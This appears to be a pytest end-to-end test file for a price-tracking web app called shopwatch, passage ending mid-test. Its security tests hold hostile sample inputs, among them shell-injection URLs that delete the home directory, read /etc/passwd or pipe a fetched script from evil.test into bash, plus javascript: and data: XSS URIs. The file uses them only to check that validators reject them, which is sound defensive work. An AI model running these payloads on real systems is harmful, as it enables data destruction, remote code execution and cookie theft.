"""End-to-end behaviour through the HTTP surface."""

from __future__ import annotations

import json
from datetime import date, timedelta

from app import provenance, store
from app.db import connect


def q930h(client):
    products = client.get("/api/products").json()
    return next(p for p in products if p["model"] == "HW-Q930H/XY")


def test_board_page_renders_the_seed_data(client):
    response = client.get("/")
    assert response.status_code == 200
    body = response.text
    assert "HW-Q930H/XY" in body
    assert "Crowdshop" in body
    assert "Harvey Norman" in body
    assert "$900" in body, "the trigger price is on the page"


def test_product_page_renders(client):
    product = q930h(client)
    response = client.get(f"/products/{product['id']}")
    assert response.status_code == 200
    assert "Price history" in response.text
    assert "Samsung Q-Series" in response.text


def test_historical_low_date_and_retailer_show_on_the_product_page(client):
    """lowest_known_date/_retailer/_notes have existed since the historical-low
    feature landed and were editable, but only ever shown inside the Edit dialog -
    the axis's own "hist low" mark had a number with no way to see when or where it
    was seen without opening Edit."""
    product = q930h(client)
    response = client.patch(
        f"/api/products/{product['id']}",
        json={
            "lowest_known_price": 869.0,
            "lowest_known_date": "2025-11-18",
            "lowest_known_retailer": "eBay (Shopping Express, AU)",
            "lowest_known_notes": "OzBargain deal history shows a one-off low via eBay.",
        },
    )
    assert response.status_code == 200

    body = client.get(f"/products/{product['id']}").text
    assert "from eBay (Shopping Express, AU)" in body
    assert "18 Nov 2025" in body
    assert "OzBargain deal history shows a one-off low via eBay." in body


def test_bullet_formatted_historical_low_notes_render_as_a_real_list(client):
    """End-to-end: the product page actually renders "- " prefixed notes (the shape
    deploy/research-runner.py's _format_reason now writes) as a <ul>, not raw dashes."""
    product = q930h(client)
    client.patch(
        f"/api/products/{product['id']}",
        json={
            "lowest_known_price": 69.30,
            "lowest_known_notes": "- First point, from OzBargain\n- Second point, checked through Aug 2026",
        },
    )

    body = client.get(f"/products/{product['id']}").text
    assert "<li>First point, from OzBargain</li>" in body
    assert "<li>Second point, checked through Aug 2026</li>" in body


def test_no_historical_low_caption_without_a_lowest_known_price(client):
    """The seeded soundbar has a manually-curated historical_low_price ($800, a
    classification threshold) but no lowest_known_price (the actual tracked-lowest
    record) - these are two distinct fields (see #101's PR body for the full
    ambiguity). The caption is about the latter, and must not render off the former,
    which the product-edit dialog's own "Historical low territory" field label would
    otherwise false-positive a naive substring check on."""
    product = q930h(client)
    assert product["historical_low_price"] == 800
    assert product["lowest_known_price"] is None

    body = client.get(f"/products/{product['id']}").text
    # "Historical low territory" (the edit dialog's own field label) is expected to be
    # present - checking for that substring alone would false-positive here. The
    # caption this test guards against always reads "Historical low $..." instead.
    assert "Historical low $" not in body
    assert "Historical low notes" not in body


def test_seed_values_are_present_and_correct(client):
    product = q930h(client)
    assert product["verdict"] == "MAYBE"
    assert product["trigger_price"] == 900
    assert product["excellent_price"] == 850
    assert product["historical_low_price"] == 800
    assert "Q990" in product["fit_notes"]

    by_retailer = {listing["retailer_name"]: listing for listing in product["listings"]}
    assert by_retailer["Crowdshop"]["advertised_price"] == 869
    assert by_retailer["Crowdshop"]["freight"] is None, "freight is unresolved, not free"
    assert by_retailer["Crowdshop"]["classification"] == "UNRESOLVED"
    assert "869-889" in by_retailer["Crowdshop"]["price_guide"]
    assert by_retailer["Appliance Central"]["advertised_price"] == 1059
    assert by_retailer["Harvey Norman"]["advertised_price"] == 1695
    assert by_retailer["JB Hi-Fi"]["advertised_price"] == 1699
    assert by_retailer["The Good Guys"]["advertised_price"] == 1699
    assert all(listing["condition"] == "NEW" for listing in product["listings"])


def test_the_matrix_is_ordered_by_delivered_price(client):
    product = q930h(client)
    names = [listing["retailer_name"] for listing in product["listings"]]
    assert names[0] == "Crowdshop"
    assert names[1] == "Appliance Central"


def test_inline_edit_persists_and_recalculates(client):
    product = q930h(client)
    listing = next(listing for listing in product["listings"]
                   if listing["retailer_name"] == "Crowdshop")

    response = client.patch(f"/api/retailers/{listing['id']}", json={"freight": "25"})
    assert response.status_code == 200
    updated = response.json()["listing"]
    assert updated["freight"] == 25.0
    assert updated["delivered_price"] == 894.0
    assert updated["delivered_resolved"] is True
    assert updated["classification"] == "TRIGGER_MET"
    assert updated["provenance"]["freight"]["manual_locked"] == 1

    # and it is still there on a fresh read
    again = client.get(f"/api/retailers/{listing['id']}").json()
    assert again["freight"] == 25.0


def test_manual_override_survives_an_imported_automated_update(client):
    product = q930h(client)
    listing = next(listing for listing in product["listings"]
                   if listing["retailer_name"] == "Crowdshop")
    client.patch(f"/api/retailers/{listing['id']}", json={"freight": "89"})

    result = client.post(
        "/api/import",
        json=[{"model": "HW-Q930H/XY", "retailer": "Crowdshop", "price": 879, "freight": 0,
               "stock": "In Stock"}],
    ).json()
    assert result["applied"] == 1
    assert "freight" in result["results"][0]["preserved_manual"]

    fresh = client.get(f"/api/retailers/{listing['id']}").json()
    assert fresh["freight"] == 89.0, "the manual value survived"
    assert fresh["advertised_price"] == 879.0, "the unlocked field updated"


def test_clear_override_returns_the_field_to_automation(client):
    product = q930h(client)
    listing = next(listing for listing in product["listings"]
                   if listing["retailer_name"] == "Crowdshop")
    client.patch(f"/api/retailers/{listing['id']}", json={"freight": "89"})

    cleared = client.post(
        f"/api/retailers/{listing['id']}/clear-override", json={"field": "freight"}
    ).json()
    assert cleared["cleared"] == "freight"
    assert cleared["listing"]["provenance"]["freight"]["manual_locked"] == 0

    client.post(
        "/api/import",
        json=[{"model": "HW-Q930H/XY", "retailer": "Crowdshop", "price": 869, "freight": 12}],
    )
    fresh = client.get(f"/api/retailers/{listing['id']}").json()
    assert fresh["freight"] == 12.0


def test_patching_an_unknown_field_is_rejected(client):
    product = q930h(client)
    listing = product["listings"][0]
    response = client.patch(f"/api/retailers/{listing['id']}", json={"id": 9999})
    assert response.status_code == 400


def test_export_import_round_trip_over_http(client):
    snapshot = client.get("/api/export").json()
    assert snapshot["format"] == "shopwatch-snapshot"
    result = client.post("/api/import", json=snapshot)
    assert result.status_code == 200
    assert result.json()["products"] == 1
    assert len(client.get("/api/products").json()) == 1, "re-import must not duplicate the product"


def test_csv_export(client):
    response = client.get("/api/export.csv")
    assert response.status_code == 200
    assert "HW-Q930H/XY" in response.text
    assert response.text.splitlines()[0].startswith("product,model,verdict,retailer")


def test_price_history_endpoint(client):
    product = q930h(client)
    history = client.get(f"/api/price-history/{product['id']}").json()
    assert len(history) == 5, "one seeded observation per listing"
    assert {h["source"] for h in history} == {"seed"}


def test_adding_a_listing_through_the_api(client):
    product = q930h(client)
    response = client.post(
        f"/api/products/{product['id']}/retailers",
        json={"retailer": "Bing Lee", "advertised_price": 1450, "condition": "NEW",
              "stock_status": "Limited"},
    )
    assert response.status_code == 201
    listing = response.json()
    assert listing["retailer_name"] == "Bing Lee"
    assert listing["provenance"]["advertised_price"]["manual_locked"] == 1


def test_adding_a_listing_with_a_promo_end_date(client):
    """Issue #97: an optional, manually-entered promo end-date on a listing."""
    product = q930h(client)
    # Relative, not hard-coded: a fixed "future" date lapses and the test starts
    # failing on a clean tree (it did, on 22 Sep 2026, with the date 2026-09-21).
    ends = date.today() + timedelta(days=30)
    response = client.post(
        f"/api/products/{product['id']}/retailers",
        json={"retailer": "Centre Com", "advertised_price": 99, "condition": "NEW",
              "price_valid_until": ends.isoformat()},
    )
    assert response.status_code == 201
    listing = response.json()
    assert listing["price_valid_until"] == ends.isoformat()
    assert listing["provenance"]["price_valid_until"]["manual_locked"] == 1
    assert listing["promo_lapsed"] is False

    body = client.get(f"/products/{product['id']}").text
    assert f"ends {ends.day} {ends.strftime('%b')}" in body


def test_a_lapsed_promo_end_date_is_flagged_but_not_rejected(client):
    product = q930h(client)
    response = client.post(
        f"/api/products/{product['id']}/retailers",
        json={"retailer": "Centre Com", "advertised_price": 99, "price_valid_until": "2020-01-01"},
    )
    listing = response.json()
    assert listing["promo_lapsed"] is True

    body = client.get(f"/products/{product['id']}").text
    assert "ended 1 Jan 2020" in body


def test_a_malformed_promo_end_date_is_rejected(client):
    product = q930h(client)
    response = client.post(
        f"/api/products/{product['id']}/retailers",
        json={"retailer": "Centre Com", "price_valid_until": "next Monday"},
    )
    assert response.status_code == 400


def test_promo_end_date_can_be_edited_inline_and_cleared(client):
    product = q930h(client)
    listing = next(listing for listing in product["listings"]
                   if listing["retailer_name"] == "Crowdshop")

    response = client.patch(
        f"/api/retailers/{listing['id']}", json={"price_valid_until": "2026-12-25"}
    )
    assert response.status_code == 200
    updated = response.json()["listing"]
    assert updated["price_valid_until"] == "2026-12-25"

    cleared = client.patch(
        f"/api/retailers/{listing['id']}", json={"price_valid_until": ""}
    ).json()["listing"]
    assert cleared["price_valid_until"] is None
    assert cleared["promo_lapsed"] is False


def test_creating_a_product_in_another_category(client):
    response = client.post(
        "/api/products",
        json={"name": "LG C4 65", "model": "OLED65C4PSA", "brand": "LG", "category": "tv",
              "trigger_price": 2200, "specs": {"panel_technology": "OLED", "hdmi_21_ports": 4}},
    )
    assert response.status_code == 201
    product = response.json()
    assert product["specs"]["panel_technology"] == "OLED"
    assert client.get(f"/products/{product['id']}").status_code == 200


def test_category_profiles_are_seeded(client):
    fields = client.get("/api/categories/tv/fields").json()
    keys = {f["field_key"] for f in fields}
    assert {"panel_technology", "hdmi_21_ports", "vrr", "earc"} <= keys
    soundbar = {f["field_key"] for f in client.get("/api/categories/soundbar/fields").json()}
    assert "channels" in soundbar and "panel_technology" not in soundbar


def test_adding_a_category_field_without_a_migration(client):
    client.post(
        "/api/categories/espresso_machine/fields",
        json={"field_key": "boiler_type", "label": "Boiler type", "kind": "text"},
    )
    fields = client.get("/api/categories/espresso_machine/fields").json()
    assert fields[0]["field_key"] == "boiler_type"


def test_price_watch_endpoint_runs_and_reports(client):
    summary = client.post("/api/price-watch/run", json={"send_alerts": False}).json()
    assert summary["status"] == "ok"
    assert summary["skipped"] == 5, "seeded listings have no URL, so nothing is fetched"


def test_healthz(client):
    body = client.get("/healthz").json()
    assert body["status"] == "ok"
    assert body["products"] == 1


def test_seeding_twice_does_not_duplicate_or_clobber(seeded):
    from app.seed import seed_all

    with connect(seeded) as conn:
        product = store.product_by_model(conn, "HW-Q930H/XY")
        listing = store.find_listing(
            conn, product["id"], store.ensure_retailer(conn, "Crowdshop")["id"]
        )
        provenance.set_field(conn, listing["id"], "advertised_price", 799.0,
                             state=provenance.MANUAL)
        conn.commit()

    seed_all()

    with connect(seeded) as conn:
        assert conn.execute("SELECT COUNT(*) c FROM products").fetchone()["c"] == 1
        assert conn.execute("SELECT COUNT(*) c FROM listings").fetchone()["c"] == 5
        assert conn.execute(
            "SELECT advertised_price FROM listings WHERE id = ?", (listing["id"],)
        ).fetchone()[0] == 799.0


# --------------------------------------------------------- asset cache busting


def test_asset_token_changes_when_a_static_file_changes(tmp_path, monkeypatch):
    """The token must be derived from the bytes, not from a constant somebody bumps.

    Caddy serves /static immutable for 30 days. The old token was a hand-maintained
    version string that was never bumped, so every stylesheet change since the first
    commit was invisible to a returning browser with nothing reporting it.
    """
    from app import main

    static = tmp_path / "static"
    static.mkdir()
    (static / "style.css").write_text("body{color:red}")
    monkeypatch.setattr(main, "BASE_DIR", tmp_path)

    before = main._asset_version()
    (static / "style.css").write_text("body{color:blue}")
    after = main._asset_version()

    assert before != after, "a changed stylesheet must produce a new token"
    assert len(after) == 12


def test_asset_token_is_stable_when_nothing_changes(tmp_path, monkeypatch):
    """A restart that changes no asset must not expire every browser's cache."""
    from app import main

    static = tmp_path / "static"
    static.mkdir()
    (static / "app.js").write_text("console.log(1)")
    monkeypatch.setattr(main, "BASE_DIR", tmp_path)

    assert main._asset_version() == main._asset_version()


def test_healthz_still_reports_the_semantic_version():
    """The asset hash answers "is your cache stale". It is not the app's version."""
    from fastapi.testclient import TestClient

    from app import __version__, main

    with TestClient(main.app) as client:
        assert client.get("/healthz").json()["version"] == __version__
        assert client.get("/api/meta").json()["version"] == __version__


# --------------------------------------------------------- the LLM helper bundle


def test_llm_helper_zip_contains_the_canonical_script_unmodified():
    """The bundle must never fork its own copy of llm-helper.py - one canonical file,
    tested and documented in exactly one place."""
    import zipfile
    from io import BytesIO

    from app import main

    canonical = (main.BASE_DIR.parent / "tools" / "llm-helper.py").read_bytes()
    with zipfile.ZipFile(BytesIO(main.build_llm_helper_zip("https://example.test"))) as zf:
        assert zf.read("llm-helper.py") == canonical


def test_llm_helper_zip_writes_the_url_as_data_not_into_any_launcher():
    """The whole point of the bundle over the plain script: nobody has to type or
    edit a command - but the URL must land as plain data (shopwatch-url.txt) that a
    launcher reads at runtime, never spliced into the launcher's own script text. A
    value later parsed by a shell only has to be wrong once for that boundary to
    become a command injection; a value merely read into a variable never gets a
    second pass through the parser no matter what it contains."""
    import zipfile
    from io import BytesIO

    from app import main

    zip_bytes = main.build_llm_helper_zip("https://shop.example.test")
    with zipfile.ZipFile(BytesIO(zip_bytes)) as zf:
        assert zf.read("shopwatch-url.txt").decode() == "https://shop.example.test"
        launchers = [n for n in zf.namelist() if n.startswith("run-")]
        assert len(launchers) == 6, "expected one launcher per OS x backend combination"
        for name in launchers:
            content = zf.read(name).decode()
            assert "https://shop.example.test" not in content, (
                f"{name} embeds the URL directly instead of reading shopwatch-url.txt"
            )


def test_validate_base_url_rejects_shell_metacharacters():
    """The control this test exists for: a URL is about to be read by a shell (or
    cmd.exe) as either a variable's content or, in an earlier version of this code,
    spliced directly into script text. Either way, anything that isn't a plain
    scheme://host[:port] must never reach the zip at all."""
    import pytest
    from fastapi import HTTPException

    from app import main

    malicious = [
        'https://evil.test"; rm -rf ~ #',
        "https://evil.test'; touch pwned; '",
        "https://evil.test`id`",
        "https://evil.test$(id)",
        "https://evil.test & calc.exe",
        "https://evil.test | cat /etc/passwd",
        "https://evil.test\nrm -rf ~",
    ]
    for value in malicious:
        with pytest.raises(HTTPException) as exc_info:
            main._validate_base_url(value)
        assert exc_info.value.status_code == 400


def test_validate_base_url_accepts_ordinary_shopwatch_urls():
    """The control must not reject the exact shape window.location.origin produces -
    a false positive here would break the feature for everyone, not just attackers."""
    from app import main

    for value in ("https://shop.home.lunt.au", "http://127.0.0.1:8797", "https://example.com:8443"):
        assert main._validate_base_url(value) == value


def test_llm_helper_zip_route_rejects_a_malicious_url():
    """Reproduces the exact exploit shape end to end: a crafted download link whose
    `url` breaks out of a shell string. Verified to fail against the pre-fix code
    (the malicious text landed inside a launcher's own script, un-rejected) and pass
    against the fix (400, nothing built)."""
    from fastapi.testclient import TestClient

    from app import main

    with TestClient(main.app) as client:
        r = client.get(
            "/tools/llm-helper.zip",
            params={"url": 'https://evil.test"; curl evil.test/x.sh | bash #'},
        )
        assert r.status_code == 400


def test_llm_helper_zip_launchers_are_executable():
    """A .command/.sh that lands non-executable after unzipping on Mac/Linux is just
    a text file to double-click - the entire point of the bundle would be lost."""
    import zipfile
    from io import BytesIO

    from app import main

    with zipfile.ZipFile(BytesIO(main.build_llm_helper_zip("https://example.test"))) as zf:
        for info in zf.infolist():
            if info.filename.startswith("run-"):
                mode = (info.external_attr >> 16) & 0o777
                assert mode & 0o100, f"{info.filename} is not executable ({oct(mode)})"


def test_llm_helper_zip_route_uses_the_provided_url_over_the_request_host():
    """The modal's own JS supplies `url` (window.location.origin) precisely because a
    server-side guess at the request's host can be wrong behind a reverse proxy - a
    provided url must win."""
    import zipfile
    from io import BytesIO

    from fastapi.testclient import TestClient

    from app import main

    with TestClient(main.app) as client:
        r = client.get("/tools/llm-helper.zip", params={"url": "https://shop.example.test"})
        assert r.status_code == 200
        assert r.headers["content-type"] == "application/zip"
        assert "shopwatch-llm-helper.zip" in r.headers["content-disposition"]
        with zipfile.ZipFile(BytesIO(r.content)) as zf:
            assert zf.read("shopwatch-url.txt").decode() == "https://shop.example.test"


# ------------------------------------------------- the axis is reachable as text


def test_the_axis_publishes_its_figures_as_text(client):
    """role="img" hid the whole subtree, so every plotted price was unreachable.

    The dots stay hidden (absolutely positioned marks read as noise), but the same
    numbers have to exist as real content or the axis is picture-only.
    """
    html = client.get("/").text

    assert 'role="img"' not in html, "the axis subtree must not be hidden behind an image role"
    assert "visually-hidden" in html, "the text version of the axis must be present"
    assert "Appliance Central" in html
    assert "target:" in html, "thresholds must be readable as text, not only as ticks"


def test_the_zoom_target_says_what_the_keys_do(client):
    html = client.get("/").text
    assert "aria-describedby" in html
    assert "arrow keys" in html, "a focusable zoom target with undiscoverable keys is not usable"


# --------------------------------------------------- the ruled-out API surface


def _first_listing(client):
    products = client.get("/api/products").json()
    pid = next(p["id"] for p in products if p["model"] == "HW-Q930H/XY")
    return client.get(f"/api/products/{pid}/retailers").json()[0]


def test_ruling_out_and_back_in_round_trips(client):
    listing = _first_listing(client)
    lid = listing["id"]

    out = client.post(f"/api/retailers/{lid}/ruled-out",
                      json={"ruled_out": True, "reason": "group-buy, freight never quotable"})
    assert out.status_code == 200
    assert out.json()["ruled_out"] is True

    back = client.post(f"/api/retailers/{lid}/ruled-out", json={"ruled_out": False})
    assert back.status_code == 200
    assert back.json()["ruled_out"] is False


def test_putting_it_back_keeps_the_reason_it_was_ruled_out_for(client):
    """The migration promised the reason travels with the listing.

    Nulling it on the way back destroyed the decision trail silently: un-rule and
    re-rule, and the original reasoning was gone with nothing recording it existed.
    """
    lid = _first_listing(client)["id"]
    client.post(f"/api/retailers/{lid}/ruled-out",
                json={"ruled_out": True, "reason": "group-buy, freight never quotable"})
    back = client.post(f"/api/retailers/{lid}/ruled-out", json={"ruled_out": False}).json()

    assert back["ruled_out"] is False, "the flag must clear"
    assert back["reason"] == "group-buy, freight never quotable", "the reason must survive"
    assert back["at"] is not None, "so must when it happened"


def test_ruling_out_an_unknown_listing_is_a_404(client):
    assert client.post("/api/retailers/999999/ruled-out",
                       json={"ruled_out": True}).status_code == 404


def test_a_ruled_out_listing_stops_being_nominated_through_the_api(client):
    """End to end: the flag set over HTTP changes what the board answers."""
    products = client.get("/api/products").json()
    pid = next(p["id"] for p in products if p["model"] == "HW-Q930H/XY")
    listings = client.get(f"/api/products/{pid}/retailers").json()
    priced = [x for x in listings if x.get("delivered_price") is not None]
    assert priced, "control: the seed must have something priced, or this proves nothing"
    cheapest = min(priced, key=lambda x: x["delivered_price"])

    before = client.get(f"/api/products/{pid}").json()
    assert before["best_retailer"] == cheapest["retailer_name"], (
        "control: the cheapest listing is nominated before anything is ruled out"
    )

    client.post(f"/api/retailers/{cheapest['id']}/ruled-out",
                json={"ruled_out": True, "reason": "not buying from them"})
    after = client.get(f"/api/products/{pid}").json()
    assert after["best_retailer"] != cheapest["retailer_name"], (
        "a ruled-out listing cannot be nominated as best"
    )


# ------------------------------------------- placeholders and ruled-out render


def test_the_money_filter_does_not_emit_an_em_dash():
    """The escaped \\u2014 form hid this from the dash purge's grep, and _money is the
    widest emitter: every {{ x|money }} with no value went through it, so the board
    showed a different placeholder depending on which template rendered the cell."""
    from app.main import _money

    assert _money(None) == "-"
    assert _money("") == "-"
    assert "—" not in _money(None)
    assert _money(1699) == "$1,699", "control: a real value still formats"


def test_safe_url_filter_allows_only_http_and_https():
    """l.url is free text from three write paths (typed by hand, /api/import, the
    research runner) and none of them constrain the scheme - this is the one place
    that has to catch a javascript: URI before it ever reaches an href."""
    from app.main import _safe_url

    assert _safe_url("https://example.com/product") == "https://example.com/product"
    assert _safe_url("http://example.com/product") == "http://example.com/product"
    assert _safe_url("javascript:alert(document.cookie)") is None
    assert _safe_url("JavaScript:alert(1)") is None, "scheme match must be case-insensitive"
    assert _safe_url("  javascript:alert(1)") is None, "leading whitespace must not evade it"
    assert _safe_url("data:text/html,<script>alert(1)</script>") is None
    assert _safe_url("vbscript:msgbox(1)") is None
    assert _safe_url("//evil.example.com") is None, "no scheme at all is rejected, not assumed safe"
    assert _safe_url(None) is None
    assert _safe_url("") is None
    assert _safe_url(123) is None, "a non-string value must not reach .split()"


def test_a_javascript_uri_listing_url_never_renders_as_a_clickable_href(client):
    """End-to-end control, not just the unit test above: a malicious url stored on a
    real listing must not survive into the rendered page as href="javascript:...".
    Covers both places l.url renders - the row's own open-link icon and the
    "Notes and source" detail link."""
    pid = q930h(client)["id"]
    listing = client.get(f"/api/products/{pid}/retailers").json()[0]
    payload = "javascript:alert(document.cookie)"

    client.patch(f"/api/retailers/{listing['id']}", json={"url": payload})
    body = client.get(f"/products/{pid}").text

    assert f'href="{payload}"' not in body
    assert payload not in body, "the raw scheme must not appear anywhere in the response at all"


def test_a_patch_response_carries_ruled_out_for_the_client(client):
    """The board re-renders a row from this payload after an inline edit.

    Without ruled_out in it the client cannot tell, and re-rendered a ruled-out
    listing as "excellent" with the buy styling applied. This is the contract that
    fix depends on, so it is asserted here rather than left implicit.
    """
    products = client.get("/api/products").json()
    pid = next(p["id"] for p in products if p["model"] == "HW-Q930H/XY")
    listing = client.get(f"/api/products/{pid}/retailers").json()[0]

    client.post(f"/api/retailers/{listing['id']}/ruled-out",
                json={"ruled_out": True, "reason": "group-buy"})
    body = client.patch(f"/api/retailers/{listing['id']}",
                        json={"advertised_price": 700}).json()
    payload = body.get("listing", body)
    assert "ruled_out" in payload, "the client cannot style what it is not told"
    assert payload["ruled_out"], "and it must reflect the current state"


def test_latest_research_job_is_null_with_no_history(client):
    pid = q930h(client)["id"]
    response = client.get(f"/api/products/{pid}/research-jobs/latest")
    assert response.status_code == 200
    assert response.json() is None


def test_latest_research_job_is_a_404_for_an_unknown_product(client):
    response = client.get("/api/products/999999/research-jobs/latest")
    assert response.status_code == 404


def test_latest_research_job_reflects_the_one_just_created(client):
    """The product page's retry entry point reads this to pre-fill retailers - it must
    see the job the wizard (or a retry) just queued, not a stale or unrelated one."""
    pid = q930h(client)["id"]
    retailer_id = client.get(f"/api/products/{pid}/retailers").json()[0]["retailer_id"]

    created = client.post("/api/research-jobs",
                           json={"product_id": pid, "retailer_ids": [retailer_id]}).json()

    latest = client.get(f"/api/products/{pid}/research-jobs/latest").json()
    assert latest["id"] == created["id"]
    assert {r["retailer_id"] for r in latest["results"]} == {retailer_id}


def test_create_historical_low_research_job_needs_no_retailer_ids(client):
    """issue #93: "has this ever been cheaper" is one question about the product, not
    one per retailer, so this must succeed with no retailer_ids at all - unlike the
    default kind="price", which requires at least one."""
    pid = q930h(client)["id"]
    created = client.post("/api/research-jobs", json={"product_id": pid, "kind": "historical_low"})
    assert created.status_code == 202
    body = created.json()
    assert body["kind"] == "historical_low"
    assert body["results"] == []


def test_report_historical_low_then_complete_through_the_api(client):
    pid = q930h(client)["id"]
    created = client.post(
        "/api/research-jobs", json={"product_id": pid, "kind": "historical_low"}
    ).json()

    reported = client.post(
        f"/api/research-jobs/{created['id']}/historical-low",
        json={"price": 799.0, "date": "2025-08-11", "retailer": "Bing Lee",
              "notes": "Found on a deal-tracking forum thread.", "confidence": "LOW"},
    ).json()
    assert reported["historical_low_price"] == 799.0
    assert reported["historical_low_confidence"] == "LOW"

    completed = client.post(
        f"/api/research-jobs/{created['id']}/complete", json={"status": "DONE"}
    ).json()
    assert completed["status"] == "DONE"
    assert completed["historical_low_price"] == 799.0  # the finding survives completion


def test_report_historical_low_never_writes_the_product(client):
    """The control this test exists for: this endpoint has no code path to
    products.lowest_known_price - only a person using the value it returns, then
    saving through PATCH /api/products/{id} themselves, can change that field."""
    product = q930h(client)
    pid = product["id"]
    assert product["lowest_known_price"] is None
    created = client.post(
        "/api/research-jobs", json={"product_id": pid, "kind": "historical_low"}
    ).json()

    client.post(
        f"/api/research-jobs/{created['id']}/historical-low",
        json={"price": 799.0, "confidence": "HIGH"},
    )

    refreshed = client.get(f"/api/products/{pid}").json()
    assert refreshed["lowest_known_price"] is None


def test_report_historical_low_is_a_404_for_an_unknown_job(client):
    response = client.post("/api/research-jobs/999999/historical-low", json={"price": 1})
    assert response.status_code == 404


def test_report_historical_low_round_trips_other_retailers(client):
    """issue #98: retailers noticed along the way survive through the API as a raw
    JSON string on the job, same convention as a retailer-discovery job's result."""
    pid = q930h(client)["id"]
    created = client.post(
        "/api/research-jobs", json={"product_id": pid, "kind": "historical_low"}
    ).json()

    reported = client.post(
        f"/api/research-jobs/{created['id']}/historical-low",
        json={
            "price": 799.0, "confidence": "LOW",
            "other_retailers": [
                {"name": "Centre Com", "url": "https://www.centrecom.com.au/x"},
                {"name": "Evil Co", "url": "javascript:alert(1)"},
            ],
        },
    ).json()

    other = json.loads(reported["historical_low_other_retailers"])
    assert other == [
        {"name": "Centre Com", "url": "https://www.centrecom.com.au/x"},
        {"name": "Evil Co", "url": None},
    ]

    fetched = client.get(f"/api/research-jobs/{created['id']}").json()
    assert json.loads(fetched["historical_low_other_retailers"]) == other


def test_create_research_job_rejects_an_unknown_kind(client):
    pid = q930h(client)["id"]
    response = client.post("/api/research-jobs", json={"product_id": pid, "kind": "made_up"})
    assert response.status_code == 400


def test_create_retailer_accepts_a_homepage(client):
    row = client.post("/api/retailers", json={"name": "Officeworks", "homepage": "https://officeworks.com.au"}).json()
    assert row["homepage"] == "https://officeworks.com.au"
    assert row["never_scrapable"] == []  # parity with GET /api/retailers, not just adapter_available


def test_create_retailer_rejects_a_non_string_homepage_instead_of_crashing(client):
    """The control this test exists for: (payload.get('homepage') or '').strip() raised
    an unhandled AttributeError on a non-string JSON value before this was fixed - a
    malformed client request must get a 400, never a 500."""
    response = client.post("/api/retailers", json={"name": "Officeworks", "homepage": 12345})
    assert response.status_code in (200, 201)  # non-string homepage is ignored, not fatal
    assert response.json()["homepage"] is None


def test_create_llm_job_rejects_a_non_string_query_instead_of_crashing(client):
    response = client.post("/api/llm-jobs", json={"query": 12345})
    assert response.status_code == 400


def test_create_retailer_search_job_rejects_a_non_string_query_instead_of_crashing(client):
    response = client.post("/api/retailer-search-jobs", json={"query": 12345})
    assert response.status_code == 400


def test_retailer_search_job_lifecycle_through_the_api(client):
    query = '{"product_name": "Test Product", "model": "TEST-1", "excluded_names": [], "excluded_homepages": []}'
    created = client.post("/api/retailer-search-jobs", json={"query": query}).json()
    assert created["status"] == "QUEUED"

    claimed = client.post("/api/retailer-search-jobs/claim").json()
    assert claimed["id"] == created["id"]
    assert claimed["status"] == "RUNNING"

    result = '{"retailers": [{"name": "Bunnings", "homepage": "https://www.bunnings.com.au"}], "note": null}'
    completed = client.post(
        f"/api/retailer-search-jobs/{created['id']}/complete",
        json={"status": "DONE", "result": result},
    ).json()
    assert completed["status"] == "DONE"

    fetched = client.get(f"/api/retailer-search-jobs/{created['id']}").json()
    assert fetched["result"] == result


def test_retailer_search_job_claim_is_empty_when_nothing_is_queued(client):
    assert client.post("/api/retailer-search-jobs/claim").json() is None


def test_get_retailer_search_job_is_a_404_for_an_unknown_id(client):
    response = client.get("/api/retailer-search-jobs/999999")
    assert response.status_code == 404


# ------------------------------------------------------------------- deleting a group


def _new_product(client, name, model):
    return client.post("/api/products", json={"name": name, "model": model}).json()


def test_delete_group_detaches_its_members(client):
    a = _new_product(client, "RTX 4070", "RTX-4070-A")
    b = _new_product(client, "RX 7800 XT", "RX-7800-XT-A")
    group = client.post(f"/api/products/{a['id']}/group", json={"name": "GPU search"}).json()
    group_id = group["group_id"]
    client.post(f"/api/products/{b['id']}/group", json={"group_id": group_id})

    response = client.delete(f"/api/groups/{group_id}")
    assert response.status_code == 200

    assert client.get(f"/api/groups/{group_id}").status_code == 404
    assert client.get(f"/api/products/{a['id']}").json()["group_id"] is None
    assert client.get(f"/api/products/{b['id']}").json()["group_id"] is None


def test_deleting_an_unknown_group_is_a_404(client):
    assert client.delete("/api/groups/999999").status_code == 404


def test_leaving_the_last_member_auto_deletes_the_group(client):
    a = _new_product(client, "RTX 4070", "RTX-4070-A")
    b = _new_product(client, "RX 7800 XT", "RX-7800-XT-A")
    group = client.post(f"/api/products/{a['id']}/group", json={"name": "GPU search"}).json()
    group_id = group["group_id"]
    client.post(f"/api/products/{b['id']}/group", json={"group_id": group_id})

    client.delete(f"/api/products/{a['id']}/group")
    assert client.get(f"/api/groups/{group_id}").status_code == 200, "b is still a member"

    client.delete(f"/api/products/{b['id']}/group")
    assert client.get(f"/api/groups/{group_id}").status_code == 404


def test_permanently_deleting_the_last_member_auto_deletes_the_group(client):
    a = _new_product(client, "RTX 4070", "RTX-4070-A")
    group = client.post(f"/api/products/{a['id']}/group", json={"name": "GPU search"}).json()
    group_id = group["group_id"]

    response = client.delete(f"/api/products/{a['id']}/permanently")
    assert response.status_code == 200
    assert client.get(f"/api/groups/{group_id}").status_code == 404


# ------------------------------------------------ letting a retailer be excluded (#112)


def test_get_retailers_includes_excluded_and_listing_count(client):
    product = q930h(client)
    listing = next(x for x in product["listings"] if x["retailer_name"] == "Crowdshop")
    rows = client.get("/api/retailers").json()
    row = next(r for r in rows if r["id"] == listing["retailer_id"])
    assert not row["excluded"]
    assert row["listing_count"] >= 1


def test_excluding_a_retailer_cascades_to_every_listing_across_products(client):
    """issue #112 item 4: excluding also stops watching what is already tracked,
    not just future adds - and it does so everywhere that retailer has a listing,
    not just on the product it happened to be excluded from."""
    product1 = q930h(client)
    listing1 = next(x for x in product1["listings"] if x["retailer_name"] == "Crowdshop")
    retailer_id = listing1["retailer_id"]

    product2 = client.post(
        "/api/products", json={"name": "LG C4 65", "model": "OLED65C4PSA"}
    ).json()
    listing2 = client.post(
        f"/api/products/{product2['id']}/retailers",
        json={"retailer": "Crowdshop", "advertised_price": 999},
    ).json()
    assert listing2["retailer_id"] == retailer_id, "same retailer, ensure_retailer dedup"

    response = client.patch(f"/api/retailer/{retailer_id}", json={"excluded": True})
    assert response.status_code == 200
    assert response.json()["excluded"] is True

    fresh1 = client.get(f"/api/retailers/{listing1['id']}").json()
    fresh2 = client.get(f"/api/retailers/{listing2['id']}").json()
    assert fresh1["active"] == 0
    assert fresh2["active"] == 0


def test_excluding_a_retailer_does_not_touch_another_retailers_listings(client):
    """The control for the cascade test above: exclusion must be scoped to the
    retailer actually named, not every listing on the product."""
    product = q930h(client)
